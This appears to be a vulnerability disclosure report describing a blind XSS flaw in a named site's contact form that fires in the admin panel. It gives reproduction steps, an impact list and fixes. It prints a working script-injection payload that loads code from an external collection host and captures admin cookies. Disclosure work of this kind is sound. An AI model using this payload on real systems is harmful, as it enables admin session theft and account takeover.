## Title
Blind Cross-Site Scripting (XSS) via Contact Form - Admin Panel Execution on Contact Portal

## Vulnerability Type
Blind XSS (Out-of-Band)

## Severity
High

## Summary
The contact form at `https://kzlabs.in/subdomains/contact/` accepts and stores user-supplied input across the Your Name, Subject, and Your Message fields without sanitization or output encoding. Unlike Reflected or standard Stored XSS, this is a Blind XSS — the payload does not execute on the public-facing contact page itself, but instead fires when an administrator views the submitted contact request in the backend admin panel. Execution was confirmed via an out-of-band callback to `xss.report`, which received a hit (including admin session data) when the admin loaded the contact submission in their panel.

## Vulnerable Endpoint
**Injection point (public):** `https://kzlabs.in/subdomains/contact/`

**Execution point (backend):** Admin panel - exact URL unknown (backend only), confirmed via out-of-band callback

## Vulnerable Fields
| Field | Notes |
|---|---|
| Your Name | Stored, executes in admin panel |
| Subject | Stored, executes in admin panel |
| Your Message | Stored, executes in admin panel |

## Steps to Reproduce

### Step 1 - Submit contact form with blind XSS payload
1. Navigate to `https://kzlabs.in/subdomains/contact/`
2. Fill the contact form with the following payload in all three fields:
   - **Your Name:** `'"><script src=https://xss.report/c/tanishq></script>`
   - **Subject:** `'"><script src=https://xss.report/c/tanishq></script>`
   - **Your Message:** `'"><script src=https://xss.report/c/tanishq></script>`
3. Submit the form.

### Step 2 - Wait for admin to view the submission
1. The submitted contact request appears in the admin panel backend.
2. When the administrator opens or previews the contact submission, the injected `<script>` tag loads and executes the payload hosted at `https://xss.report/c/tanishq`.

### Step 3 - Verify execution via xss.report callback
1. Log in to your `xss.report` dashboard at `https://xss.report`
2. Observe the incoming notification - confirming the payload executed in the admin's browser context, along with captured data including:
   - Admin panel URL (where the payload fired)
   - Admin session cookies
   - Browser and OS information
   - Screenshot of the admin panel (if enabled)

## Payload Used
```
'"><script src=https://xss.report/c/tanishq></script>
```

## Proof of Concept

<img width="1917" height="1030" alt="image" src="https://github.com/user-attachments/assets/16916424-f9c7-47c4-a5a0-b82382f5ebb5" />
<img width="1917" height="1040" alt="image" src="https://github.com/user-attachments/assets/e3163561-e9e6-4f76-97f9-a2a3c588fd28" />


## Impact
Blind XSS executing in an admin panel carries significantly higher impact than standard user-facing XSS:

- **Admin session takeover** — the callback captures the administrator's session cookie, allowing the attacker to log into the admin panel directly and gain full administrative access to the application.
- **Admin panel reconnaissance** - `xss.report` captures a screenshot of the page where the payload fired, revealing the admin panel's URL structure, features, and any sensitive data visible on screen.
- **Persistent access** - since the payload fires every time the admin views the contact submission, the attacker receives repeated callbacks until the submission is deleted.
- **Privilege escalation** - with admin access, an attacker can potentially compromise the entire application, access all user data, modify content, or pivot to the server.
- **Stealth** - Blind XSS is not detectable from the user-facing side and produces no visible error or alert on the contact page, making it harder to detect than standard XSS.

## Recommendations for Fix
1. Apply context-aware output encoding (e.g. `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` in PHP) on all contact form fields before rendering them anywhere in the admin panel.
2. Implement a strict Content-Security-Policy header on the admin panel (avoiding `unsafe-inline` and restricting `script-src` to self only), which would block external script loading (`<script src=https://xss.report/...>`) even if a stored payload reaches the page.
3. Never render raw user-submitted content in the admin panel without encoding — admin interfaces are high-value targets and should be treated with at least as much scrutiny as public-facing pages.
4. Consider implementing a separate sanitization pass for all content displayed in admin views, since admin panels often pull data from multiple sources and are frequently overlooked during security reviews.
